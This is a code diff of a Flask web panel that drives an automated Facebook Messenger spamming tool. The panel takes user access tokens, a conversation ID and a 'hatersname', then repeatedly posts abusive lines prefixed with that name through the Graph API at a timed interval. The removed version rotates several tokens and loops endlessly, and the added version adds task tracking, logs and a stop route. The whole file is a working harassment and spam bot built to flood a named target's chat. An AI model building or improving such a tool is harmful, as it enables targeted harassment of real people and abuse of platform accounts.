@@ -1,109 +1,93 @@
-from flask import Flask, render_template, request, redirect
-import subprocess
-import os
-import threading
-import requests
-import time
-from platform import system
+from flask import Flask, request, render_template, redirect, jsonify
+import threading, time, random, string, os, requests
 
 app = Flask(__name__)
 UPLOAD_FOLDER = 'uploads'
+LOG_FOLDER = 'logs'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+os.makedirs(LOG_FOLDER, exist_ok=True)
 
-# === HTML PANEL ===
+tasks = {}
+
+def generate_task_id():
+    return "manix-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=7))
+
 @app.route('/')
 def index():
     return render_template('index.html')
 
 @app.route('/upload', methods=['POST'])
-def upload_files():
-    for file_key in ['token', 'convo', 'file', 'hatersname', 'time', 'password']:
-        file = request.files.get(file_key)
-        if file:
-            file.save(os.path.join(app.config['UPLOAD_FOLDER'], f"{file_key}.txt"))
-    return redirect('/')
+def upload():
+    token = request.form.get('token')
+    convo = request.form.get('convo')
+    hater = request.form.get('hatersname')
+    delay = int(request.form.get('time', 5))
+    fbid = request.form.get('fbid')
+    np_file = request.files.get('np')
+    task_id = generate_task_id()
+    
+    file_path = None
+    if np_file:
+        file_path = os.path.join(UPLOAD_FOLDER, f"{task_id}_np.txt")
+        np_file.save(file_path)
 
-@app.route('/run-script')
-def run_script():
-    threading.Thread(target=send_messages).start()
-    return 'Script is now running in the background.'
+    log_path = os.path.join(LOG_FOLDER, f"{task_id}.txt")
+    stop_event = threading.Event()
+    tasks[task_id] = {'stop': stop_event, 'sent': 0, 'running': True, 'log': log_path}
 
-# === MESSAGE SENDER ===
-def send_messages():
-    with open('uploads/password.txt', 'r') as file:
-        password = file.read().strip()
+    thread = threading.Thread(target=send_messages, args=(token, convo, hater, delay, fbid, file_path, task_id, stop_event))
+    thread.start()
+    return f"Task Started! Task ID: <b>{task_id}</b><br><br><a href='/status/{task_id}'>Check Status</a>"
 
-    entered_password = password  # Removed input prompt for automation
+def send_messages(token, convo, hater, delay, fbid, file_path, task_id, stop_event):
+    try:
+        with open(file_path, 'r') as f:
+            lines = [line.strip() for line in f if line.strip()]
+    except:
+        lines = [f"{hater} 😂"]
 
-    if entered_password != password:
-        print('[-] Incorrect Password!')
-        return
+    log_file = os.path.join(LOG_FOLDER, f"{task_id}.txt")
+    with open(log_file, 'a') as log:
+        for i, line in enumerate(lines):
+            if stop_event.is_set():
+                break
+            url = f"https://graph.facebook.com/v15.0/t_{convo}/"
+            payload = {
+                'access_token': token,
+                'message': f"{hater} {line}"
+            }
+            response = requests.post(url, data=payload)
+            tasks[task_id]['sent'] += 1
+            now = time.strftime('%Y-%m-%d %H:%M:%S')
+            if response.ok:
+                msg = f"[{now}] SENT ✅: {hater} {line}"
+            else:
+                msg = f"[{now}] FAIL ❌: {hater} {line} — {response.text}"
+            print(msg)
+            log.write(msg + "\n")
+            log.flush()
+            time.sleep(delay)
+        tasks[task_id]['running'] = False
 
-    with open('uploads/token.txt', 'r') as file:
-        tokens = file.readlines()
-    num_tokens = len(tokens)
+@app.route('/status/<task_id>')
+def status(task_id):
+    task = tasks.get(task_id)
+    if not task:
+        return f"No such task ID: {task_id}"
+    with open(task['log'], 'r') as log:
+        lines = log.readlines()
+    return f"<b>Task ID:</b> {task_id}<br>Status: {'🟢 Running' if task['running'] else '⛔ Stopped'}<br>Messages Sent: {task['sent']}<br><br><pre>{''.join(lines[-10:])}</pre>"
 
-    requests.packages.urllib3.disable_warnings()
-
-    def cls():
-        if system() == 'Linux':
-            os.system('clear')
-        elif system() == 'Windows':
-            os.system('cls')
-
-    cls()
-
-    headers = {
-        'Connection': 'keep-alive',
-        'Cache-Control': 'max-age=0',
-        'Upgrade-Insecure-Requests': '1',
-        'User-Agent': 'Mozilla/5.0',
-        'Accept': '*/*',
-        'Accept-Encoding': 'gzip, deflate',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'referer': 'www.google.com'
-    }
-
-    access_tokens = [token.strip() for token in tokens]
-
-    with open('uploads/convo.txt', 'r') as file:
-        convo_id = file.read().strip()
-
-    with open('uploads/file.txt', 'r') as file:
-        text_file_path = file.read().strip()
-
-    with open(text_file_path, 'r') as file:
-        messages = file.readlines()
-
-    num_messages = len(messages)
-    max_tokens = min(num_tokens, num_messages)
-
-    with open('uploads/hatersname.txt', 'r') as file:
-        haters_name = file.read().strip()
-
-    with open('uploads/time.txt', 'r') as file:
-        speed = int(file.read().strip())
-
-    while True:
-        try:
-            for message_index in range(num_messages):
-                token_index = message_index % max_tokens
-                access_token = access_tokens[token_index]
-                message = messages[message_index].strip()
-                url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
-                parameters = {'access_token': access_token, 'message': f"{haters_name} {message}"}
-                response = requests.post(url, json=parameters, headers=headers)
-                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-                if response.ok:
-                    print(f"[+] Message {message_index + 1} sent: {haters_name} {message} at {current_time}")
-                else:
-                    print(f"[x] Failed to send {message_index + 1}: {haters_name} {message} at {current_time}")
-                time.sleep(speed)
-            print("[+] All messages sent. Restarting...")
-        except Exception as e:
-            print(f"[!] Error: {e}")
-
-# === FLASK ENTRY ===
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+@app.route('/stop', methods=['POST'])
+def stop():
+    task_id = request.form.get('task_id')
+    task = tasks.get(task_id)
+    if not task:
+        return f"❌ No task with ID: {task_id}"
+    task['stop'].set()
+    task['running'] = False
+    return f"✅ Task {task_id} stopped successfully."
+    
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
